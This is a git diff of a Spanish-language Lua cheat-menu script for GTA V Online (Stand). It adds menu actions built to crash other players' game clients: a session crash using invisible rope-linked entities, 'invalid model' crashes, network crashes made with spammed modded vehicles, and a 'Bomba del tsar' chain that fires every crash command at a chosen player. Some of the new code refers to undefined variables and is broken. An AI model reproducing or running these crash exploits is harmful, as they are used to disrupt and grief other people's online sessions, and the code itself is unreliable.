@@ -10,7 +10,7 @@ util.require_natives(1663599433)
 util.toast("Bienvenide Al Script!!")
 util.toast("Cargando, espere... (1-2s)")
 local response = false
-local localVer = 3.711
+local localVer = 3.8
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
     response = true
@@ -1191,6 +1191,29 @@ players.on_join(function(player_id)
     --    end)
     --end)
 
+    menu.divider(crashes, "(Sesion)")
+
+    menu.action(crashes, "Crashear Sesion V1 'Test'", {}, "", function(on_loop)
+        PHYSICS.ROPE_LOAD_TEXTURES()
+        local hashes = {2132890591, 2727244247}
+        local pc = players.get_position(player_id)
+        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
+        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
+        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
+        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
+        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
+        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
+        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
+        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
+        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
+        util.yield(1000)
+        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
+        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
+        PHYSICS.DELETE_CHILD_ROPE(rope)
+        PHYSICS.ROPE_UNLOAD_TEXTURES()
+    end)
+
+
     menu.divider(crashes, "(Ryze Exclusivo)")
 
     menu.action(crashes, "Inbloqueable", {"crashv2"}, "Funcando (Menus populares - Stand)", function()
@@ -1222,7 +1245,10 @@ players.on_join(function(player_id)
 
     local twotake = menu.list(crashes, "2T1 Crashes", {}, "")
 
-    menu.action(twotake, "Modelo Invalido V1", {"crashv4"}, "", function()
+    local modelc = menu.list(twotake, "Model Crashes", {}, "")
+
+
+    menu.action(modelc, "Modelo Invalido V1", {"crashv4"}, "", function()
         BlockSyncs(player_id, function()
             local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
@@ -1231,7 +1257,7 @@ players.on_join(function(player_id)
         end)
     end)
 
-    menu.action(twotake, "Modelo Invalido V2", {"crashv5"}, "", function()
+    menu.action(modelc, "Modelo Invalido V2", {"crashv5"}, "", function()
         BlockSyncs(player_id, function()
             local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
@@ -1268,7 +1294,7 @@ players.on_join(function(player_id)
 
     end)
 
-    menu.action(twotake, "Modelo Invalido V3", {"crashv10"}, "", function()
+    menu.action(modelc, "Modelo Invalido V3", {"crashv10"}, "", function()
         local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
         local hash = util.joaat("cs_taostranslator2")
         while not STREAMING.HAS_MODEL_LOADED(hash) do
@@ -1294,6 +1320,101 @@ players.on_join(function(player_id)
             util.yield(10)
         end
 
+    end)
+
+    menu.action(modelc, "Modelo Invalido V4", {"crashv12"}, "", function(on_toggle)
+        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
+        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
+        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            for i = 0, 100 do 
+                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
+                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
+                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
+                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
+                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
+            util.yield(10)
+            entities.delete_by_handle(Object_pizza2)
+            entities.delete_by_handle(Object_pizza2)
+            entities.delete_by_handle(Object_pizza2)
+            entities.delete_by_handle(Object_pizza2)
+            return
+        end
+    end)
+
+    local netc = menu.list(twotake, "Crasheos De Red", {}, "")
+
+    -- Skidded from keramist.
+
+    menu.action(netc, "Crasheo de red V1", {"crashv13"}, "", function(on_toggle)
+        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
+        local vehicles = {}
+        for i = 1, 4 do
+            util.create_thread(function()
+                request_model(hashes[i])
+                local pcoords = players.get_position(player_id)
+                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
+                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
+                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
+                for j = 0, 49 do
+                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1 
+                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
+                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
+                end
+                for j = 0, 20 do
+                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
+                end
+                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
+                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
+                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
+                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
+                for ai = 1, 50 do
+                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
+                    pcoords = players.get_position(player_id)
+                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
+                    util.yield()
+                end
+                vehicles[#vehicles+1] = veh
+            end)
+        end
+        util.yield(2000)
+        for _, v in pairs(vehicles) do
+            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
+            entities.delete_by_handle(v)
+        end
+    end)
+
+    menu.action(netc, "Crasheo de red V2", {"crashv14"}, "", function(on_loop)
+        local cord = players.get_position(player_id)
+        local a1 = entities.create_object(-930879665, cord)
+        local a2 = entities.create_object(3613262246, cord)
+        local b1 = entities.create_object(452618762, cord)
+        local b2 = entities.create_object(3613262246, cord)
+        for i = 1, 10 do
+            util.request_model(-930879665)
+            util.yield(10)
+            util.request_model(3613262246)
+            util.yield(10)
+            util.request_model(452618762)
+            util.yield(300)
+            entities.delete_by_handle(a1)
+            entities.delete_by_handle(a2)
+            entities.delete_by_handle(b1)
+            entities.delete_by_handle(b2)
+            util.request_model(452618762)
+            util.yield(10)
+            util.request_model(3613262246)
+            util.yield(10)
+            util.request_model(-930879665)
+            util.yield(10)
+        end
+        util.toast("Terminado.")
     end)
 
     local scrcrash = menu.list(twotake, "Script Crashes", {}, "")
@@ -1777,6 +1898,70 @@ players.on_join(function(player_id)
         menu.trigger_commands("crashv10"..players.get_name(player_id))
         util.yield(800)
         menu.trigger_commands("crashv11"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv12"..players.get_name(player_id))
+        -- Turned off because of a self-crash error
+        --util.yield(600)
+        --menu.trigger_commands("crashv4"..players.get_name(player_id))
+        util.yield(2500)
+        menu.trigger_commands("crash"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("ngcrash"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("footlettuce"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("steamroll"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("choke"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("flashcrash"..players.get_name(player_id))
+        util.yield(1800)
+        util.toast("Espera en lo que se limpia todo...")
+        --menu.trigger_command(outSync, "off")
+        menu.trigger_commands("rcleararea")
+        menu.trigger_commands("potatomode off")
+        menu.trigger_commands("trafficpotato off")
+        util.yield(8000)
+        menu.trigger_commands("anticrashcamera off")
+    end)
+
+    menu.action(crashes, "Bomba del tsar V4", {"tsarbomba4"}, "Crash demandante de pc, si no tienes buena pc no te recomiendo usarlo (Inbloqueable uwu) \n(Necesita Regular Para Funcionar Bien/ Muy Posible Overload)", function()
+        local objective = player_id
+        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
+        menu.trigger_commands("anticrashcamera on")
+        menu.trigger_commands("potatomode on")
+        menu.trigger_commands("trafficpotato on")
+        util.toast("Iniciando...")
+        util.toast("Pobre man")
+        menu.trigger_commands("rlag3"..players.get_name(player_id))
+        util.yield(2500)
+        menu.trigger_commands("crashv1"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv2"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv3"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv4"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv5"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv6"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv7"..players.get_name(player_id))
+        util.yield(700)
+        menu.trigger_commands("crashv8"..players.get_name(player_id))
+        util.yield(700)
+        menu.trigger_commands("crashv9"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv10"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv11"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv12"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv13"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv14"..players.get_name(player_id))
         -- Turned off because of a self-crash error
         --util.yield(600)
         --menu.trigger_commands("crashv4"..players.get_name(player_id))
@@ -3479,11 +3664,14 @@ end
 --    end
 --end
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+-- Real Helicopter Mode Start
+
 get_vtable_entry_pointer = function(address, index)
     return memory.read_long(memory.read_long(address) + (8 * index))
 end
 get_sub_handling_types = function(vehicle, type)
-    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x938)
+    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
     local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
     local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
     local types = {registerd = sub_handling_count, found = 0}
@@ -3511,29 +3699,30 @@ local better_heli_handling_offsets = {
     ["fPitchStabilise"] = 0x3C --idk what it does but it seems to help
 }
 
---realheli = menu.list(vehicles, "Helicopteros", {}, "Opciones de control real en helicoptero")
+realheli = menu.list(vehicles, "Helicopteros", {}, "Opciones de control real en helicoptero")
 
---menu.slider_float(realheli, "Potencia Helicoptero Real", {"heliThrust"}, "Potencia de los helis", 0, 1000, 50, 1, function (value)
---    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
---    if CflyingHandling then
---        memory.write_float(CflyingHandling + thrust_offset, value * 0.01)
---    else
---        util.toast("Error\nentra en un heli")
---    end
---end)
+menu.slider_float(realheli, "Potencia Helicoptero Real", {"heliThrust"}, "Potencia de los helis", 0, 1000, 50, 1, function (value)
+    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
+    if CflyingHandling then
+        memory.write_float(CflyingHandling + thrust_offset, value * 0.01)
+    else
+        util.toast("Error\nentra en un heli")
+    end
+end)
 
---menu.action(realheli, "Modo helicoptero real", {"betterheli"}, "Deshabilita la estabilizacion vertical de los vtol para modo de funcionamiento real", function ()
---    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
---    if CflyingHandling then
---        for _, offset in pairs(better_heli_handling_offsets) do
---            memory.write_float(CflyingHandling + offset, 0)
---        end
---        util.toast("Echo\nIntenta no chocar")
---    else
---        util.toast("Error\nentra en un heli")
---    end
---end)
+menu.action(realheli, "Modo helicoptero real", {"betterheli"}, "Deshabilita la estabilizacion vertical de los vtol para modo de funcionamiento real", function ()
+    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
+    if CflyingHandling then
+        for _, offset in pairs(better_heli_handling_offsets) do
+            memory.write_float(CflyingHandling + offset, 0)
+        end
+        util.toast("Echo\nIntenta no chocar")
+    else
+        util.toast("Error\nentra en un heli")
+    end
+end)
 
+-- Real Helicopter Mode End
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 --Impulse SportMode start
 
